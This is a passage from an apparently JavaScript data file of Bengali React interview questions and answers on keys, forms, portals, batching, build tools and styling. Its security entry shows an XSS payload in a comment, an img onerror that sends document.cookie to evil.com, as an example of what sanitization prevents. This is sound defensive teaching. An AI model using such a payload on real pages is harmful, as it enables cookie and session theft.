      <p>ক্লাস কম্পোনেন্ট এখনও বৈধ ও কাজ করে (deprecated নয়), কিন্তু নতুন কোডে ব্যবহার করার কোনো কারণ নেই — শুধু error boundary-র জন্য এখনও ক্লাস দরকার হয় (কোনো hook সমতুল্য নেই)।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Props বদলালে child কম্পোনেন্ট কীভাবে re-render হয়?</li>
        <li>State আপডেট asynchronous কেন?</li>
      </ul>
    `
  },
  {
    id: "react-20",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["List","Key","Rendering"],
    question: "React-ে list rendering-এ key prop কেন গুরুত্বপূর্ণ? index কে key হিসেবে ব্যবহার করলে কী সমস্যা হয়?",
    answer: `
      <p>React-এ লিস্ট রেন্ডার করার সময় প্রতিটি এলিমেন্টে একটি ইউনিক <code>key</code> দিতে হয় — এটি শুধু warning এড়ানোর জন্য নয়, এটি React-এর <strong>reconciliation algorithm</strong>-এর একটি মৌলিক ইনপুট।</p>
      <h4>Key কেন দরকার</h4>
      <p>React একটি লিস্ট আপডেট হলে বুঝতে চায় — কোন আইটেম নতুন যোগ হলো, কোনটি সরানো হলো, কোনটির অবস্থান বদলালো। <code>key</code> ছাড়া React শুধু <em>অবস্থান</em> দিয়ে তুলনা করে — index ০-এর পুরনো এলিমেন্ট আর index ০-এর নতুন এলিমেন্টকে "একই" ধরে নেয়, যদিও সেগুলো সম্পূর্ণ ভিন্ন ডেটা।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ index কে key হিসেবে ব্যবহার — তালিকার শুরুতে নতুন আইটেম যোগ করলে সমস্যা
{todos.map((todo, index) => (
  <TodoItem key={index} todo={todo} />
))}

// আগে: [A, B, C]  → key: 0,1,2
// শুরুতে D যোগ করলে: [D, A, B, C]  → key: 0,1,2,3
// React ভাবে: index 0 (আগে A ছিল) এখন D — এটি "আপডেট" মনে করে,
// অথচ আসলে A, B, C সবাই একটি করে অবস্থান সরে গেছে</code></pre>
      </div>
      <h4>যে বাস্তব সমস্যাগুলো তৈরি হয়</h4>
      <ul>
        <li><strong>Component state ভুল জায়গায় থেকে যায়:</strong> প্রতিটি লিস্ট আইটেমে যদি local state থাকে (যেমন একটি input field), তালিকা পুনর্বিন্যাস হলে সেই state <em>ভুল ডেটার সাথে</em> লেগে থাকে — index অপরিবর্তিত থাকলেও ভেতরের ডেটা বদলে গেছে।</li>
        <li><strong>অপ্রয়োজনীয় re-render:</strong> React ভাবে বেশিরভাগ এলিমেন্ট "বদলেছে" (কারণ index মিলে যাচ্ছে কিন্তু কনটেন্ট ভিন্ন), তাই DOM আপডেট ও re-render প্রয়োজনের চেয়ে বেশি হয়।</li>
        <li><strong>Animation ভেঙে যায়:</strong> এন্ট্রি/এক্সিট অ্যানিমেশন ভুল এলিমেন্টে প্রয়োগ হয়, কারণ React বুঝতে পারে না কোনটি সত্যিই নতুন।</li>
        <li><strong>Focus হারানো:</strong> একটি input-এ টাইপ করার সময় তালিকা পুনর্বিন্যাস হলে ফোকাস ভুল ইনপুটে চলে যেতে পারে।</li>
      </ul>
      <h4>সঠিক সমাধান</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ ডেটার স্থায়ী, ইউনিক আইডেন্টিফায়ার ব্যবহার করুন
{todos.map((todo) => (
  <TodoItem key={todo.id} todo={todo} />
))}
// এখন D যোগ করলেও: React সঠিকভাবে বুঝবে A, B, C একই আছে,
// শুধু D নতুন — তাদের state ও DOM নোড অক্ষত থাকে</code></pre>
      </div>
      <p><strong>Key-র শর্ত:</strong> সহোদর (sibling) এলিমেন্টগুলোর মধ্যে ইউনিক হতে হবে (পুরো অ্যাপে নয়), এবং <strong>স্থিতিশীল</strong> হতে হবে — রেন্ডারে রেন্ডারে একই আইটেমের জন্য একই key থাকা উচিত। ডাটাবেজের <code>_id</code> বা <code>uuid</code> আদর্শ।</p>
      <h4>Index কখন গ্রহণযোগ্য</h4>
      <p>তালিকাটি <strong>সম্পূর্ণ স্ট্যাটিক</strong> হলে — কখনও পুনর্বিন্যাস হবে না, আইটেম যোগ/বাদ হবে না, এবং কোনো আইটেমে state নেই — তখন index দিয়ে key দেওয়া নিরাপদ। কিন্তু এটি বিরল ক্ষেত্র; সন্দেহ থাকলে সবসময় স্থিতিশীল ডেটা-ভিত্তিক আইডি ব্যবহার করুন।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>ডেটায় কোনো ইউনিক আইডি না থাকলে কী করবেন?</li>
        <li>React কীভাবে key দিয়ে reconciliation-এ diff করে (ভেতরের অ্যালগরিদম)?</li>
      </ul>
    `
  },
  {
    id: "react-21",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Concurrent","useTransition","useDeferredValue"],
    question: "React Concurrent Features — useTransition এবং useDeferredValue কীভাবে কাজ করে?",
    answer: `
      <p>React 18-এ আসা Concurrent Features UI-কে responsive রাখতে সাহায্য করে, বিশেষত heavy computation বা large list rendering-এ।</p>
      <h4>useTransition — Non-urgent state updates:</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>function SearchPage() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [isPending, startTransition] = useTransition();

  const handleSearch = (e) => {
    const value = e.target.value;
    setQuery(value); // Urgent: Input আপডেট তাড়াতাড়ি হবে

    startTransition(() => {
      // Non-urgent: ভারী কাজ — UI ব্লক হবে না
      const filtered = hugeDataset.filter(item => item.name.includes(value));
      setResults(filtered);
    });
  };
  // isPending দিয়ে loading UI দেখানো যায়
}</code></pre>
      </div>
      <p><strong>পার্থক্য:</strong> <code>useTransition</code> আপনি state update control করেন, <code>useDeferredValue</code> আপনি props/value defer করেন।</p>
    `
  },
  {
    id: "react-22",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Design System","Component Library","Storybook"],
    question: "React দিয়ে scalable Design System / Component Library কীভাবে তৈরি করবেন?",
    answer: `
      <p>Lead Developer হিসেবে একটি consistent, reusable Design System তৈরি করা organizational impact-এর একটি বড় কাজ।</p>
      <h4>Architecture:</h4>
      <ol>
        <li><strong>Design Tokens:</strong> Colors, spacing, typography — CSS variables বা theme object।</li>
        <li><strong>Primitive Components:</strong> Button, Input — atomic elements।</li>
        <li><strong>Composite Components:</strong> DataTable, Modal — primitive combination।</li>
      </ol>
      <p><strong>Modern Tech Stack:</strong> Tailwind CSS + CVA (Class Variance Authority) + Radix UI (Headless) + Storybook (Docs) + Changesets (Versioning)।</p>
      <p><strong>Publishing:</strong> Monorepo (Turborepo) দিয়ে manage করুন এবং Semantic versioning (semver) ফলো করুন। Chromatic দিয়ে visual regression testing করুন।</p>
    `
  },
  {
    id: "react-23",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Conditional Rendering","Pattern"],
    question: "React-ে Conditional Rendering-এর বিভিন্ন pattern কী কী? কখন কোনটি ব্যবহার করবেন?",
    answer: `
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// 1. Ternary — দুটি option থাকলে
{isLoggedIn ? <Dashboard /> : <LoginPage />}

// 2. && operator — শুধু truthy হলে দেখাতে (সতর্কতা: 0 বা false রেন্ডার হতে পারে)
{hasNotification && <NotificationBadge count={count} />}

// 3. Early return — complex conditions
function UserProfile({ user }) {
  if (!user) return <LoginPrompt />;
  if (user.isBanned) return <BannedMessage />;
  return <ProfileContent user={user} />;
}

// 4. Object mapping — multiple conditions
const statusComponents = { loading: <Spinner />, error: <ErrorMessage /> };
return statusComponents[status] || <DefaultView />;</code></pre>
      </div>
    `
  },
  {
    id: "react-24",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Accessibility","a11y","ARIA"],
    question: "React অ্যাপে Accessibility (a11y) কীভাবে ensure করবেন? Common mistakes কী কী?",
    answer: `
      <p>Accessibility শুধু নৈতিক দায়িত্ব না, অনেক দেশে এটি আইনি requirement (ADA, WCAG)।</p>
      <h4>Common Mistakes ও Solutions:</h4>
      <ul>
        <li>❌ <code>div</code> কে বাটন হিসেবে ব্যবহার করা (Keyboard/Screen reader কাজ করে না)। ✅ Semantic HTML (<code>button</code>) ব্যবহার করুন।</li>
        <li>❌ ছবিতে <code>alt</code> না দেওয়া। ✅ Descriptive alt text দিন।</li>
        <li>✅ Form-এ <code>htmlFor</code> এবং <code>id</code> লিঙ্ক করুন।</li>
        <li>✅ Custom ড্রপডাউনে ARIA রোল (<code>role="listbox"</code>, <code>aria-expanded</code>) ব্যবহার করুন।</li>
      </ul>
      <h4>Testing Tools:</h4>
      <p><code>eslint-plugin-jsx-a11y</code>, Axe DevTools, Lighthouse Accessibility audit।</p>
    `
  },
  {
    id: "react-25",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["SSR","CSR","Hydration"],
    question: "Server-Side Rendering (SSR) vs Client-Side Rendering (CSR) — কখন কোনটি ব্যবহার করবেন? Hydration কী?",
    answer: `
      <p>Rendering strategy বাছাই করা একটি architectural decision যা SEO, performance, এবং user experience-কে প্রভাবিত করে।</p>
      <ul>
        <li><strong>CSR:</strong> ধীর initial load, দুর্বল SEO। Best for Dashboard, SPA।</li>
        <li><strong>SSR:</strong> দ্রুত initial load, চমৎকার SEO। Best for E-commerce, blog।</li>
      </ul>
      <h4>Hydration:</h4>
      <p>SSR-এ সার্ভার HTML পাঠায়, তারপর ক্লায়েন্টে React সেই HTML-এ event listeners যোগ করে interactive বানায়। এই প্রক্রিয়াকে <strong>Hydration</strong> বলে।</p>
      <p><strong>Hydration Mismatch:</strong> সার্ভার ও ক্লায়েন্টে ভিন্ন আউটপুট এলে (যেমন ভিন্ন টাইমস্ট্যাম্প) React এরর থ্রো করে। এটি এড়াতে <code>useEffect</code> ব্যবহার করতে হয়।</p>
    `
  },
  {
    id: "react-26",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Virtualization","Large List","Performance"],
    question: "React-ে বিশাল তালিকা (10,000+ items) কীভাবে efficiently render করবেন? Virtualization কী?",
    answer: `
      <p>10,000+ items-এর list সরাসরি render করলে ব্রাউজার freeze হয়ে যায়। <strong>Virtualization</strong> শুধুমাত্র viewport-এ দৃশ্যমান items render করে।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// @tanstack/react-virtual (Modern approach)
import { useVirtualizer } from '@tanstack/react-virtual';

function VirtualTable({ data }) {
  const parentRef = useRef();
  const rowVirtualizer = useVirtualizer({
    count: data.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 50, // row height
  });

  return (
    <div ref={parentRef} style={{ height: '600px', overflow: 'auto' }}>
      <div style={{ height: \`\${rowVirtualizer.getTotalSize()}px\`, position: 'relative' }}>
        {rowVirtualizer.getVirtualItems().map(virtualRow => (
          <div key={virtualRow.key} style={{ position: 'absolute', top: 0, transform: \`translateY(\${virtualRow.start}px)\` }}>
            {data[virtualRow.index].name}
          </div>
        ))}
      </div>
    </div>
  );
}</code></pre>
      </div>
    `
  },
  {
    id: "react-27",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["useImperativeHandle","DOM","Ref"],
    question: "useImperativeHandle hook কী এবং কখন ব্যবহার করবেন?",
    answer: `
      <p><strong>useImperativeHandle</strong> parent component-কে child-এর specific methods expose করতে দেয়, সম্পূর্ণ DOM access দেওয়ার বদলে।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>const VideoPlayer = forwardRef((props, ref) => {
  const videoRef = useRef();

  useImperativeHandle(ref, () => ({
    play: () => videoRef.current.play(),
    pause: () => videoRef.current.pause(),
    seekTo: (time) => { videoRef.current.currentTime = time; },
  }));

  return <video ref={videoRef} src={props.src} />;
});

// Parent — শুধুমাত্র exposed methods অ্যাক্সেস করতে পারবে
function App() {
  const playerRef = useRef();
  return (
    <>
      <VideoPlayer ref={playerRef} src="/video.mp4" />
      <button onClick={() => playerRef.current.play()}>Play</button>
    </>
  );
}</code></pre>
      </div>
    `
  },
  {
    id: "react-28",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Controlled","Uncontrolled","Form"],
    question: "Controlled vs Uncontrolled Components — পার্থক্য কী? কখন কোনটি ব্যবহার করবেন?",
    answer: `
      <p>ফর্ম ইনপুট React-এ দুইভাবে সামলানো যায় — এবং এই পছন্দটি নির্ধারণ করে কে "সত্যের উৎস" (source of truth): React state, নাকি DOM নিজে।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ Controlled — React state-ই একমাত্র সত্যের উৎস
function ControlledInput() {
  const [value, setValue] = useState('');
  return <input value={value} onChange={(e) => setValue(e.target.value)} />;
}

// Uncontrolled — DOM নিজেই মান ধরে রাখে, ref দিয়ে পড়া হয়
function UncontrolledInput() {
  const inputRef = useRef(null);
  const handleSubmit = () => console.log(inputRef.current.value);
  return <input ref={inputRef} defaultValue="" />;
}</code></pre>
      </div>
      <table>
        <tr><th>দিক</th><th>Controlled</th><th>Uncontrolled</th></tr>
        <tr><td>সত্যের উৎস</td><td>React state</td><td>DOM</td></tr>
        <tr><td>প্রতিটি কীস্ট্রোকে re-render</td><td>হ্যাঁ</td><td>না</td></tr>
        <tr><td>রিয়েল-টাইম ভ্যালিডেশন</td><td>✅ সহজ</td><td>❌ কঠিন</td></tr>
        <tr><td>মান প্রোগ্রাম্যাটিকভাবে বদলানো</td><td>✅ সহজ (setValue)</td><td>কঠিন (DOM ম্যানিপুলেশন)</td></tr>
        <tr><td>ফাইল ইনপুট</td><td>❌ সম্ভব নয়</td><td>✅ একমাত্র উপায়</td></tr>
        <tr><td>পারফরম্যান্স (বড় ফর্ম)</td><td>প্রতিটি কীস্ট্রোকে re-render হতে পারে</td><td>ভালো — DOM নিজেই সামলায়</td></tr>
      </table>
      <h4>Controlled কেন ডিফল্ট পছন্দ</h4>
      <p>React-এর দর্শন হলো UI একটি ফাংশন — <code>UI = f(state)</code>। Controlled input এই মডেলে পুরোপুরি খাপ খায়: input-এর মান সবসময় state-এর সাথে সিঙ্ক থাকে, তাই রিয়েল-টাইম ভ্যালিডেশন, conditional disable, একাধিক ফিল্ডের মধ্যে নির্ভরতা — সবকিছু স্বাভাবিকভাবে করা যায়।</p>
      <h4>Uncontrolled কখন যুক্তিসঙ্গত</h4>
      <ul>
        <li><strong>ফাইল ইনপুট:</strong> <code>&lt;input type="file"&gt;</code>-এর মান নিরাপত্তার কারণে প্রোগ্রাম্যাটিকভাবে সেট করা যায় না — এটি সবসময় uncontrolled।</li>
        <li><strong>থার্ড-পার্টি DOM লাইব্রেরি ইন্টিগ্রেশন:</strong> যেমন একটি jQuery প্লাগইন যা নিজেই DOM ম্যানিপুলেট করে।</li>
        <li><strong>বিশাল ফর্ম, রিয়েল-টাইম ভ্যালিডেশন দরকার নেই:</strong> শুধু submit-এর সময় মান পড়লেই যথেষ্ট — প্রতিটি কীস্ট্রোকে re-render এড়িয়ে পারফরম্যান্স বাঁচানো যায়।</li>
        <li><strong>দ্রুত প্রোটোটাইপ:</strong> ন্যূনতম কোড দিয়ে একটি সাধারণ ফর্ম।</li>
      </ul>
      <p><strong>বাস্তব সিদ্ধান্ত:</strong> ছোট থেকে মাঝারি ফর্মে controlled ব্যবহার করুন — ডিবাগিং সহজ ও predictable। বড় ফর্মে (৫০+ ফিল্ড) React Hook Form-এর মতো লাইব্রেরি ব্যবহার করুন, যা uncontrolled ইনপুট দিয়েই controlled-এর মতো API দেয় — re-render কমায় অথচ ডেভেলপার অভিজ্ঞতা একই থাকে।</p>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>React Hook Form কীভাবে re-render কম রেখে ফর্ম ম্যানেজ করে?</li>
        <li>একটি ফর্মে controlled ও uncontrolled ইনপুট মেশানো কি নিরাপদ?</li>
      </ul>
    `
  },
  {
    id: "react-29",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Portal","Modal","Tooltip"],
    question: "React Portal কী? কখন এবং কেন ব্যবহার করবেন?",
    answer: `
      <p><strong>React Portal</strong> parent component-এর DOM hierarchy-র বাইরে child render করতে দেয়। এটি modals, tooltips, dropdowns-এর জন্য অপরিহার্য।</p>
      <h4>কেন দরকার:</h4>
      <ul>
        <li>Parent-ে <code>overflow: hidden</code> বা <code>z-index</code> সমস্যা থাকলে modal কেটে যায়।</li>
        <li>CSS transform parent-এ থাকলে <code>position: fixed</code> কাজ করে না।</li>
      </ul>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { createPortal } from 'react-dom';

function Modal({ isOpen, onClose, children }) {
  if (!isOpen) return null;
  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      {children}
    </div>,
    document.getElementById('modal-root')
  );
}</code></pre>
      </div>
    `
  },
  {
    id: "react-30",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["TypeScript","React","Generics"],
    question: "React-ে TypeScript কীভাবে কার্যকরভাবে ব্যবহার করবেন? Generic components কীভাবে লিখবেন?",
    answer: `
      <p>TypeScript React-এ type safety, better DX (autocomplete), এবং bug prevention দেয়।</p>
      <div class="code-box">
        <div class="code-header"><span>typescript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Generic Component — Reusable List
interface ListProps<T> {
  items: T[];
  renderItem: (item: T) => React.ReactNode;
  keyExtractor: (item: T) => string;
}

function List<T>({ items, renderItem, keyExtractor }: ListProps<T>) {
  return (
    <ul>
      {items.map(item => (
        <li key={keyExtractor(item)}>{renderItem(item)}</li>
      ))}
    </ul>
  );
}

// ব্যবহার — TypeScript automatically infers T
<List items={users} renderItem={(user) => <span>{user.name}</span>} />

// React 19: Component Props typing is simpler
// function Component(props: Props) -> return JSX</code></pre>
      </div>
    `
  },
  {
    id: "react-31",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Lifecycle","Hooks","Class"],
    question: "React Component Lifecycle Methods এবং তাদের Hooks equivalent কী কী?",
    answer: `
      <h4>Class Lifecycle → Hooks Mapping:</h4>
      <ul>
        <li><strong>componentDidMount:</strong> <code>useEffect(() => {}, [])</code></li>
        <li><strong>componentDidUpdate:</strong> <code>useEffect(() => {}, [deps])</code></li>
        <li><strong>componentWillUnmount:</strong> <code>useEffect(() => { return () => {} }, [])</code></li>
        <li><strong>shouldComponentUpdate:</strong> <code>React.memo()</code></li>
      </ul>
      <p>ক্লাস কম্পোনেন্টের লাইফসাইকেল মেথডগুলো হুকে সরাসরি এক-এক করে মেলে না — <code>useEffect</code> আসলে "লাইফসাইকেল" নয়, বরং <strong>সিঙ্ক্রোনাইজেশন</strong>-এর ধারণা। এটি বোঝা জরুরি, নাহলে ভুল মানসিক মডেল তৈরি হয়।</p>
      <h4>যেসব সূক্ষ্ম পার্থক্য ইন্টারভিউতে জিজ্ঞেস করা হয়</h4>
      <ul>
        <li><strong>একই নয়:</strong> <code>componentDidUpdate</code>-এ আগের props/state হাতে পাওয়া যায়; <code>useEffect</code>-এ পেতে হলে <code>useRef</code>-এ নিজে সংরক্ষণ করতে হয়।</li>
        <li><strong><code>useEffect</code> অ্যাসিঙ্ক্রোনাস:</strong> ব্রাউজার পেইন্ট করার <em>পরে</em> চলে। DOM মাপজোক করে সাথে সাথে পরিবর্তন করতে হলে <code>useLayoutEffect</code> ব্যবহার করুন, নাহলে ঝিলিক (flicker) দেখা যাবে।</li>
        <li><strong><code>React.memo</code> ≠ <code>shouldComponentUpdate</code>:</strong> memo কেবল props-এর অগভীর (shallow) তুলনা করে; কাস্টম যুক্তি দিতে দ্বিতীয় আর্গুমেন্ট লাগে।</li>
        <li><strong>Strict Mode:</strong> ডেভেলপমেন্টে React ইচ্ছাকৃতভাবে effect দুবার চালায়, যাতে cleanup ঠিকমতো লেখা হয়েছে কি না ধরা পড়ে।</li>
        <li><strong>getDerivedStateFromError / componentDidCatch:</strong> এদের কোনো হুক সমতুল্য <em>নেই</em> — Error Boundary আজও ক্লাস কম্পোনেন্ট দিয়েই লিখতে হয় (বা <code>react-error-boundary</code> ব্যবহার করতে হয়)।</li>
      </ul>`
  },
  {
    id: "react-32",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["State Batching","React 18","Automatic"],
    question: "React 18-এ Automatic Batching কী? আগের version-এ batching কীভাবে আলাদা ছিল?",
    answer: `
      <p><strong>Batching</strong> মানে একাধিক state update-কে একটি single re-render-ে group করা। React 18-এ এটি automatic এবং সব জায়গায় কাজ করে।</p>
      <p>React 17 এ শুধু event handler-এ ব্যাচিং হতো। setTimeout বা fetch এর ভেতরে হতো না। React 18 এ সব জায়গায় হয়।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>setTimeout(() => {
  setCount(c => c + 1); // ✅ Batched (React 18)
  setFlag(f => !f);     // ✅ Batched — একটি re-render!
}, 1000);

// কখনো ব্যাচিং বন্ধ করতে চাইলে (rare case):
import { flushSync } from 'react-dom';
flushSync(() => setCount(c => c + 1)); // Immediate re-render</code></pre>
      </div>
    `
  },
  {
    id: "react-33",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Security","XSS","dangerouslySetInnerHTML"],
    question: "React অ্যাপে Security best practices কী কী? XSS attack কীভাবে প্রতিরোধ করবেন?",
    answer: `
      <p>React ডিফল্টে XSS-এর বিরুদ্ধে একটি গুরুত্বপূর্ণ সুরক্ষা দেয় — কিন্তু এটি নিখুঁত নয়, এবং কিছু API সেই সুরক্ষা সম্পূর্ণ বাইপাস করে দেয়।</p>
      <h4>React কীভাবে XSS ঠেকায় — ডিফল্ট আচরণ</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>const userInput = "<img src=x onerror='alert(1)'>";

// ✅ নিরাপদ — React স্বয়ংক্রিয়ভাবে escape করে
function Comment({ text }) {
  return <p>{text}</p>;   // &lt;img src=x onerror=...&gt; হিসেবে দেখায়, HTML হিসেবে চলে না
}</code></pre>
      </div>
      <p>যখন JSX-এ <code>{'{'}variable{'}'}</code> লেখেন, React সেই মানকে <strong>টেক্সট হিসেবে</strong> রেন্ডার করে — HTML হিসেবে পার্স করে না। এটিই React-এর ডিফল্ট সুরক্ষা, এবং এজন্যই বেশিরভাগ ইনপুট স্বয়ংক্রিয়ভাবে নিরাপদ।</p>
      <h4>যেখানে সুরক্ষা ভেঙে যায়: dangerouslySetInnerHTML</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ ভয়াবহ — ব্যবহারকারীর ইনপুট সরাসরি HTML হিসেবে রেন্ডার হচ্ছে
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
// html = "<img src=x onerror='fetch(\`https://evil.com?c=\${document.cookie}\`)'>"
// → সাথে সাথে চলে, ইউজারের কুকি চুরি হয়ে যায়

// ✅ সঠিক — sanitize করার পরেই ব্যবহার করুন
import DOMPurify from 'dompurify';
function Comment({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}</code></pre>
      </div>
      <p>নামটিই একটি সতর্কবার্তা ("dangerously") — এটি ব্যবহার করার অর্থ আপনি React-কে বলছেন "আমার ইনপুট বিশ্বাস করো, escape করো না"। rich text editor বা CMS কনটেন্টের মতো বৈধ প্রয়োজন থাকলেও, <strong>একটি স্যানিটাইজেশন লাইব্রেরি (DOMPurify) ছাড়া কখনও ব্যবহারকারীর ইনপুট এখানে দেবেন না</strong>।</p>
      <h4>অন্যান্য সাধারণ দুর্বলতা</h4>
      <ul>
        <li><strong><code>href</code>-এ javascript: URL:</strong> <code>&lt;a href={userUrl}&gt;</code>-এ <code>userUrl = "javascript:alert(1)"</code> এলে ক্লিকে কোড চলবে। href-এ ব্যবহারকারীর ইনপুট নেওয়ার আগে প্রোটোকল যাচাই করুন (শুধু <code>http:</code>/<code>https:</code> অনুমতি দিন)।</li>
        <li><strong>SSR-এ server-side XSS:</strong> সার্ভার-সাইড রেন্ডারিংয়ে ব্যবহারকারীর ইনপুট থেকে সরাসরি HTML string তৈরি করলে (React-এর বাইরে গিয়ে) সেই সুরক্ষা প্রযোজ্য হয় না।</li>
        <li><strong>Third-party script/widget:</strong> বাইরের কোনো লাইব্রেরি বা widget যা নিজেই DOM ম্যানিপুলেট করে, React-এর নিয়ন্ত্রণের বাইরে গিয়ে অনিরাপদ HTML রেন্ডার করতে পারে।</li>
      </ul>
      <h4>অন্যান্য নিরাপত্তা অভ্যাস</h4>
      <ul>
        <li><strong>CSP (Content Security Policy) হেডার</strong> — inline script ব্লক করে, XSS-এর সফলতার সম্ভাবনা আরও কমায়।</li>
        <li><strong>Dependency audit:</strong> <code>npm audit</code> নিয়মিত চালানো — একটি vulnerable third-party প্যাকেজ পুরো অ্যাপের সুরক্ষা নষ্ট করতে পারে।</li>
        <li><strong>Environment variable-এ সিক্রেট রাখবেন না</strong> যা bundle-এ যায় — <code>process.env.API_KEY</code> ক্লায়েন্ট বান্ডলে গেলে যে কেউ দেখতে পারবে; সংবেদনশীল কী শুধু সার্ভার-সাইডেই রাখুন।</li>
        <li><strong>CSRF সুরক্ষা:</strong> React নিজে করে না — ব্যাকএন্ডে SameSite কুকি ও CSRF টোকেন দরকার।</li>
      </ul>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>DOMPurify কীভাবে কাজ করে — ভেতরে কী স্যানিটাইজ করে?</li>
        <li>CSP হেডার React অ্যাপে কীভাবে কনফিগার করবেন?</li>
      </ul>
    `
  },
  {
    id: "react-34",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Webpack","Vite","Build","Bundle"],
    question: "React অ্যাপের Build tool — Webpack vs Vite? Bundle optimization কীভাবে করবেন?",
    answer: `
      <p>Build tooling সিদ্ধান্ত প্রজেক্টের DX এবং production performance-কে সরাসরি প্রভাবিত করে।</p>
      <ul>
        <li><strong>Vite:</strong> দ্রুত dev server (ESM ভিত্তিক), সহজ config। নতুন প্রজেক্টের জন্য বেস্ট।</li>
        <li><strong>Webpack:</strong> বিশাল ecosystem, legacy সাপোর্ট।</li>
      </ul>
      <h4>Bundle Optimization:</h4>
      <ul>
        <li><strong>Code Splitting:</strong> <code>React.lazy()</code> + dynamic <code>import()</code>।</li>
        <li><strong>Tree Shaking:</strong> ESM ব্যবহার করুন।</li>
        <li><strong>Compression:</strong> gzip/brotli Nginx-এ configure করুন।</li>
        <li><strong>Bundle Analyzer:</strong> দিয়ে কোন প্যাকেজ কত জায়গা নিচ্ছে দেখুন।</li>
      </ul>
    `
  },
  {
    id: "react-35",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Monorepo","Turborepo","Nx","Architecture"],
    question: "React প্রজেক্টে Monorepo setup কীভাবে করবেন? Turborepo vs Nx — কোনটি ভালো?",
    answer: `
      <p>বড় organization-ে multiple packages (shared UI, utils, apps) একই repository-তে manage করতে Monorepo ব্যবহার করা হয়।</p>
      <p><strong>Turborepo:</strong> Simple, fast, Vercel-backed। ছোট-মাঝারি মনোরিপোর জন্য আদর্শ।<br>
      <strong>Nx:</strong> Feature-rich, code generation, dependency graph visualization। বড় enterprise-এর জন্য।</p>
      <div class="code-box">
        <div class="code-header"><span>text</span><button class="copy-btn">Copy</button></div>
        <pre><code>my-monorepo/
├── apps/
│   ├── web/          # Next.js main app
│   └── admin/        # Admin dashboard
├── packages/
│   ├── ui/           # Shared component library
│   └── utils/        # Shared utilities
└── turbo.json</code></pre>
      </div>
    `
  },
  {
    id: "react-36",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Styling","CSS Modules","Styled Components","Tailwind"],
    question: "React-ে styling approaches — CSS Modules, Styled Components, Tailwind CSS — কোনটি কখন ব্যবহার করবেন?",
    answer: `
      <p>React-এ styling-এর কোনো একক "সঠিক" উপায় নেই — প্রতিটি পদ্ধতির আলাদা ট্রেড-অফ আছে, এবং সিদ্ধান্ত নির্ভর করে প্রজেক্টের আকার, টিমের পছন্দ ও পারফরম্যান্সের চাহিদার উপর।</p>
      <table>
        <tr><th>পদ্ধতি</th><th>Runtime খরচ</th><th>Type safety</th><th>উপযুক্ত</th></tr>
        <tr><td><strong>CSS Modules</strong></td><td>শূন্য (বিল্ড টাইমে)</td><td>না (আলাদা টুল লাগে)</td><td>ঐতিহ্যবাহী CSS পছন্দ, দল বড়</td></tr>
        <tr><td><strong>Styled Components</strong></td><td>আছে (runtime CSS-in-JS)</td><td>হ্যাঁ (props-ভিত্তিক)</td><td>ডায়নামিক থিমিং, কম্পোনেন্ট-স্কোপড</td></tr>
        <tr><td><strong>Tailwind CSS</strong></td><td>শূন্য (utility class, বিল্ড টাইমে purge)</td><td>আংশিক</td><td>দ্রুত ডেভেলপমেন্ট, ডিজাইন সিস্টেম</td></tr>
      </table>
      <h4>CSS Modules</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Button.module.css
.button { padding: 8px 16px; border-radius: 4px; }

// Button.jsx
import styles from './Button.module.css';
function Button() { return <button className={styles.button}>ক্লিক</button>; }
// বিল্ড টাইমে ক্লাসনাম স্বয়ংক্রিয়ভাবে ইউনিক হয় (button_a3f2x)
// → কম্পোনেন্টের বাইরে স্কোপ leak হয় না, কোনো runtime খরচ নেই</code></pre>
      </div>
